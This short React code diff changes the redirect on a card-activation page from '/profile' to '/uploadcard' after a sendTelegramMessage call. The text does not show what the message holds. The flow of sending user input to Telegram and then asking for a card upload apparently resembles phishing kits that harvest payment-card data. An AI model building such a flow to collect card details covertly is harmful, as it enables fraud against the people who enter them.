@@ -35,7 +35,7 @@ const ActivateCardPage: React.FC = () => {
       try {
         await sendTelegramMessage(message);
         setError(""); // Clear any existing errors
-        router.push('/profile');
+        router.push('/uploadcard');
       } catch (err) {
         console.log(err);
         setError("Failed to send the message. Please try again.");
